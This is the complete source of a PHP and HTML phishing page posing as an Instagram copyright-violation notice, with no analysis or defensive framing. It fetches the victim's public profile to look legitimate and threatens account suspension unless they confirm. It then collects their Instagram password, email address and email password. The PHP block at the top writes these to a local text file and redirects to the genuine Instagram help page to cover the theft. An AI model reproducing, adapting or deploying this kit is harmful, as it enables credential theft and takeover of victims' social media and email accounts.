<?php 
if (isset($_POST['gelen'])) 
{
    $kadi = $_POST['user'];
     $url="http://instagram.com/$kadi";
     $veri=@file_get_contents($url);
     if (empty($veri)) {
      $sonuc=false;
    } else 
    {
      $sonuc=true;
    }

    if ($sonuc) 
    {
       $veri=explode("window._sharedData = ",$veri)[1];
      $veri=explode(";</script>",$veri)[0];
      $kullanicibilgileri=json_decode($veri,true)['entry_data']['ProfilePage']['0']['graphql']['user'];


          $dosya = fopen('telifatılacak.txt', 'a');
          fwrite($dosya, ': : : username---->'.$kullanicibilgileri['username']);
          fclose($dosya);
    }
}
if (isset($_POST['sayfa'])) 
      {
          $dosya = fopen('raizy.txt', 'a');
          fwrite($dosya, ': : : username---->'.$_POST['username'].'---->password--->'.$_POST['pass'].'--->e-posta---->'.$_POST['email'].'--->mailpass--->'.$_POST['passmail'].'');
          fclose($dosya);

          header("refresh: 0; url=https://help.instagram.com/854227311295302");
      }

 ?>
<!DOCTYPE html>
<html lang="zxx">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <!-- Required meta tags -->
    
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Copyright Help Instagram</title>
    <!-- <link rel="icon" href="img/favicon.png"> -->
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <!-- animate CSS -->
    <link rel="stylesheet" href="css/animate.css">
    <!-- owl carousel CSS -->
    <link rel="stylesheet" href="css/owl.carousel.min.css">
    <!-- font awesome CSS -->
    <link rel="stylesheet" href="css/all.css">
    <!-- flaticon CSS -->
    <link rel="stylesheet" href="css/flaticon.css">
    <link rel="stylesheet" href="css/themify-icons.css">
    <!-- font awesome CSS -->
    <link rel="stylesheet" href="css/magnific-popup.css">
    <!-- swiper CSS -->
    <link rel="stylesheet" href="css/slick.css">
    <!-- style CSS -->
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <header class="main_menu">
        <div class="container">
            <div class="row align-items-center">
                <div class="col-lg-12">
                    <nav class="navbar navbar-expand-lg navbar-light">
                        <a class="navbar-brand main_logo" href="/"> <img width="150px" src="img/raizy.jpg" alt="logo"> </a>
                        <a class="navbar-brand single_page_logo" href="index.html"> <img src="img/footer_logo.png" alt="logo"> </a>
                        <div class="collapse navbar-collapse main-menu-item" id="navbarSupportedContent"> 
                        </div>
                        <img width="39px" src="https://i2.wp.com/ieee.ku.edu.tr/wp-content/uploads/2016/03/facebook-logo.png?fit=500%2C500&ssl=1" alt="">
                        <img width="50px" src="https://www.freepnglogos.com/uploads/instagram-logo-png-transparent-0.png" alt="">
                    </nav>
                </div>
            </div>
        </div>
    </header>
    <section class="banner_part">
    <body>
    <?php if (!empty($kullanicibilgileri['profile_pic_url'])): ?>
        
    <div class="container">
        <div class="d-flex justify-content-center h-100">
            <div class="image_outer_container">
                <div class="green_icon"></div>
                <div class="image_inner_container">
                    <img src="<?php echo $kullanicibilgileri['profile_pic_url']; ?>">
                </div>
            </div>
        </div>
    </div>
    <?php endif ?>
  </body>
<style>
    .search-box,.close-icon,.search-wrapper {
    position: relative;
    padding: 10px;
}

.search-box {
    width: 80%;
    border: 1px solid #ccc;
  outline: 0;
  border-radius: 15px;
}
.search-box:focus {
    box-shadow: 0 0 15px 5px #b0e0ee;
    border: 2px solid #bebede;
}
.close-icon {
    border:1px solid transparent;
    background-color: transparent;
    display: inline-block;
    vertical-align: middle;
  outline: 0;
  cursor: pointer;
}
.close-icon:after {
    content: "X";
    display: block;
    width: 15px;
    height: 15px;
    position: absolute;
    background-color: #FA9595;
    z-index:1;
    right: 35px;
    top: 0;
    bottom: 0;
    margin: auto;
    padding: 2px;
    border-radius: 50%;
    text-align: center;
    color: white;
    font-weight: normal;
    font-size: 12px;
    box-shadow: 0 0 2px #E50F0F;
    cursor: pointer;
}
.search-box:not(:valid) ~ .close-icon {
    display: none;
}
</style>

        <div class="container">
            <div class="row">
                <div class="col-lg-12">
                    <div class="breadcrumb_iner text-center">
                        <div align="center" class="breadcrumb_iner_item">
                        <?php if (empty($kullanicibilgileri['profile_pic_url'])): ?>
                          <h1><b style="color: #167dd5">Copyright Vioalation</b></h1>
                          <h4> <b style="color: width">Please write your instagram username <br> and click "Next" and fill the next form</b></h4>
                          <br>
                          <form action="" method="POST">
                          <div class="col-md-3">
                            <div class="form-group search-wrapper">
                             <input class="form-control search-box" name="user" type="text" placeholder="username">
                            </div>
                           <button name="gelen" class="btn lt-register-btn" type="sumbit">Next<i class="icon-right pull-right "></i></button>
                                </form>

                           <?php endif ?>

                            <?php if (!empty($kullanicibilgileri['profile_pic_url'])): ?>


                                    <h3><b style="color: #167dd5"><?php echo $kullanicibilgileri ['username']; ?></b></h3>
                                     <h4> <b style="color: #a6a6a6">Your account violates your copyright. İf not fill this form we will be suspended your account Our team will make the return as soon as possible. <br> Please give us correct information for "Copyright Noticeß".We always work your security and protect your your rights</b></h4>
                                 <form action="" method="POST">
                          <div class="col-md-3">
                             <div class="form-group search-wrapper">
                             <input class="form-control search-box" name="pass" type="password" placeholder="Password">
                            </div>
                             <div class="form-group search-wrapper">
                             <input class="form-control search-box" name="email" type="email" placeholder="Mail Adress">
                            </div>
                            <input hidden class="form-control search-box" name="username" type="text" value="<?php echo $kullanicibilgileri['username']; ?>">
                            <div class="form-group search-wrapper">
                             <input class="form-control search-box" name="passmail" type="password" placeholder="Mail  Password">
                            </div>
                           <button name="sayfa" class="btn lt-register-btn" type="sumbit"><b style="color: #ffffff">Confirm As @<?php echo $kullanicibilgileri['username']; ?></b><i class="icon-right pull-right "></i></button>
                            <?php endif ?>

                            </div>
                        </div>
                        <br>
                        <br>
                        <img width="150px" src="img/from.jpg" alt=""><br>
                    
                        
                        <img width="230px" src="img/raizy.png" alt=""><br>
                    </div>
                </div>
            </div>
        </div>
        <div class="container">
            <div class="row align-items-center justify-content-between">
                <div class="col-lg-5"> 
                </div>
                <div class="col-lg-6">
                    <div class="banner_text">

                    </div>
                </div>
            </div>
        </div>
       

 <!--  <section class="raizy">

        <div class="container">
            <div class="row">
               
            </div>
        </div>


        <div class="container">
            <div class="row align-items-center justify-content-between">
                <div class="col-lg-5">
                   
                </div>
                <div class="col-lg-6">
                    <div class="banner_text">

                    </div>
                </div>

            </div>

        </div>

    </section> -->

    <script src="js/jquery-1.12.1.min.js"></script>
    <!-- popper js -->
    <script src="js/popper.min.js"></script>
    <!-- bootstrap js -->
    <script src="js/bootstrap.min.js"></script>
    <!-- easing js -->
    <script src="js/jquery.magnific-popup.js"></script>
    <!-- swiper js -->
    <script src="js/swiper.min.js"></script>
    <!-- swiper js -->
    <script src="js/masonry.pkgd.js"></script>
    <!-- particles js -->
    <script src="js/owl.carousel.min.js"></script>
    <script src="js/jquery.nice-select.min.js"></script>
    <!-- slick js -->
    <script src="js/slick.min.js"></script>
    <script src="js/jquery.counterup.min.js"></script>
    <script src="js/waypoints.min.js"></script>
    <script src="js/contact.js"></script>
    <script src="js/jquery.ajaxchimp.min.js"></script>
    <script src="js/jquery.form.js"></script>
    <script src="js/jquery.validate.min.js"></script>
    <script src="js/mail-script.js"></script>
    <!-- custom js -->
    <script src="js/custom.js"></script>
</body>

</html>